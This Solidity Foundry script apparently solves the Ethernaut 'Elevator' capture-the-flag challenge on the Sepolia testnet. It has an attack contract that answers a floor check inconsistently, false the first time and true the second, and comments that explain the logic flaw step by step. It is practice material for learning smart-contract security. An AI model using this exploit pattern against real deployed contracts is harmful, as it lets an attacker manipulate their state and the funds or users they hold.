// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Elevator} from "../src/Elevator.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0x14a45632d5e53708ed4201462c1d6babab3eeedb

contract ElevatorSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Elevator.s.sol --tc ElevatorSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Elevator elevatorInstance = Elevator(0x14a45632d5E53708Ed4201462C1D6babab3eeedb);
    ElevatorAttack attackContract = ElevatorAttack(0x38ee709034ef086bF912dAb66AEFb9891fb148cc);

    function run() external {
        // Deploy Telephone contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(elevatorInstance) == address(0)) {
            elevatorInstance = _deployElevatorContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // We will deploy the attack contract, if we don't have one.
        // You can use our contract in your testing
        if (address(attackContract) == address(0)) {
            attackContract = new ElevatorAttack(address(elevatorInstance));
            console.log("ElevatorAttack address:", address(attackContract));
        }
        // - The Elevator contract is responsible for changing the floor, if it is not the last floor
        // - The `Elevator` checks first for the given floor number. Then, if the floor is not the last it sets the floor and the top.
        // - If we made the function `isLastFloor(floor)` return different value from the first one it called, we will cause the Elevator logic to break.
        // - We will make our building return that the floor is not the top in the first call, and return that the same floor is the top in the second call.
        // - So we will pass the check in `Elevator::goTo()`, and sets the Top floor with our floor we provided.
        // - We updated the floor value, and sets the top to true. Which means we eached the top of the building, and passed the challenge.

        console.log("Top:", elevatorInstance.top());
        console.log("Floor:", elevatorInstance.floor());
        attackContract.attack();
        console.log("Top:", elevatorInstance.top());
        console.log("Floor:", elevatorInstance.floor());

        vm.stopBroadcast();
    }

    function _deployElevatorContract() internal returns (Elevator) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Elevator elevatorInstance = new Elevator();
        console.log("Elevator address:", address(elevatorInstance));
        vm.stopBroadcast();
        return elevatorInstance;
    }
}

contract ElevatorAttack {
    Elevator elevatorInstance;
    uint256 numberOfCalls;

    constructor(address target) {
        elevatorInstance = Elevator(target);
    }

    function attack() public {
        elevatorInstance.goTo(0 /* floor */ );
    }

    function isLastFloor(uint256 /* floor */ ) public returns (bool) {
        numberOfCalls++;
        if (numberOfCalls > 1) {
            return true;
        }
        return false;
    }
}
